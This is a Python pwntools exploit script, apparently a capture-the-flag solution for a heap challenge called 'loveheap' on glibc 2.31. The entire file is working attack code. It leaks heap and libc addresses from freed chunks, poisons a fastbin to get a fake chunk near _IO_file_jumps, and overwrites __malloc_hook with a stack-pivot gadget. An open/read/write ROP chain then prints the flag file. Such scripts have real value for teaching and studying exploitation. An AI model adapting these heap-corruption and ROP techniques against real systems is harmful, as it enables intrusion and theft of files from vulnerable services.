#-*- coding=utf-8 -*-
from pwn import *

g_fname = args.FNAME if (args.FNAME) else "./loveheap"
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
    g_io = process(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))

g_libc = ELF(g_libcname)

def getpid():
    if (args.LOCAL):
        log.info("PID: %d", g_io.proc.pid)
        pause()


s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline


def opt(idx):
    sla(b">>", str(idx).encode())

def add(size):
    opt(1)
    sla(b"size\n", str(size).encode())

def delete(idx):
    opt(2)
    sla(b"idx\n", str(idx).encode())

def show(idx):
    opt(4)
    sla(b"idx\n", str(idx).encode())

def edit(idx, content):
    opt(3)
    sla(b"idx\n", str(idx).encode())
    sa(b"content:\n", content)

def pwn():
    ## libc-2.31

    # fill tcache[0x70], prepare for fastbin attack
    for  i in range(8): # take slot 0~7
        add(0x60)

    # fill tcache[0x100]
    for i in range(9):  # take slot 8~16
        add(0xf0)
    
    for i in range(8):
        delete(i)
        delete(i+8)

    # getpid()

    # leak heap
    show(14)
    heap_addr = u64(rl()[:-1].ljust(8, b'\0'))
    heap_base = heap_addr - 0xb20
    tcache_key = heap_base + 0x10
    log.info("heap@%#x\ntcache key=%#x" % (heap_base, tcache_key))

    # leak libc (main_arena)
    show(15)
    arena_addr = u64(rl()[:-1].ljust(8, b'\0'))
    libc_base = arena_addr - 0x1bebe0 # main_arena+96 of 2.31
    addr_mhook = libc_base + g_libc.sym["__malloc_hook"]
    addr_stdout = libc_base + g_libc.sym["_IO_2_1_stdout_"]
    addr_jump_tbl = libc_base + g_libc.sym["_IO_file_jumps"]
    log.info("libc@%#x\n__malloc_hook@%#x\nstdout@%#x\n_IO_file_jumps@%#x" % (libc_base, addr_mhook, addr_stdout, addr_jump_tbl))

    # addr_fake_fast_chunk = addr_mhook - 0x33
    # addr_fake_fast_chunk = addr_stdout + 0x9d # location ahead stdout.vtable
    addr_fake_fast_chunk = addr_jump_tbl - 0x23 # location ahead 
    log.info("fake fast chunk at %#x" % addr_fake_fast_chunk)

    # getpid()

    # apply fastbin attack:
    #   malloc to fake chunk near __malloc_hook
    edit(7, p64(addr_fake_fast_chunk))
    add(0x60) # take slot 17
    edit(17, "./flag\0")
    # getpid()

    addr_flag_path = heap_base + 0x5b0 # save "./flag" in chunk 7
    addr_rop = heap_base + 0xe20 # ORW ROP stores in chunk 16
    
    off_leave_ret = [0x4d570, 0x5aa48] # local, remote
    addr_level_ret = libc_base + off_leave_ret[0]
    
    log.info("path of flag at %#x\nROP of ORW at %#x\n'leave; ret'@%#x" % (addr_flag_path, addr_rop, addr_level_ret))

    off_syscall_ret = [0x580da, 0x66229] # local, remote
    addr_syscall_ret = libc_base + off_syscall_ret[0]

    off_prdi_ret = [0x26796]
    off_prsi_ret = [0x2890f]
    off_prax_ret = [0x3ee88]
    off_prdx_ret = [0xcb1cd]

    addr_prax = libc_base + off_prax_ret[0]
    addr_prdi = libc_base + off_prdi_ret[0]
    addr_prsi = libc_base + off_prsi_ret[0]
    addr_prdx = libc_base + off_prdx_ret[0]

    payload_orw = flat([
        # open(p_flg_path, O_RDONLY, 0);
        addr_prax, 2, # syscall num
        addr_prdi, addr_flag_path,
        addr_prsi, 0,
        addr_prdx, 0,
        addr_syscall_ret,
        # read(3, addr_flg_content, 0x100)
        addr_prax, 0,
        addr_prdi, 3,
        addr_prsi, addr_flag_path,
        addr_prdx, 0x100,
        addr_syscall_ret,
        # write(1, addr_flg_content, 0x0100)
        addr_prax, 1,
        addr_prdi, 1,
        addr_prsi, addr_flag_path,
        addr_prdx, 0x100,
        addr_syscall_ret
    ])

    log.info("length of ORW ROP payload: %d" % len(payload_orw))

    edit(16, payload_orw)

    add(0x60) # slot 18: malloc to fake fast chunk near __malloc_hook
    edit(18, b'a'*0x13 + p64(addr_level_ret)) # __malloc_hook = addr_level_ret

    getpid()

    # call calloc and trigger __malloc_hook invokation.
    add(addr_rop - 8) # size cannot bigger than 0x200


if ("__main__" == __name__):
    if (args.DEBUG):
        context.log_level = "debug"
    pwn()
    g_io.interactive()
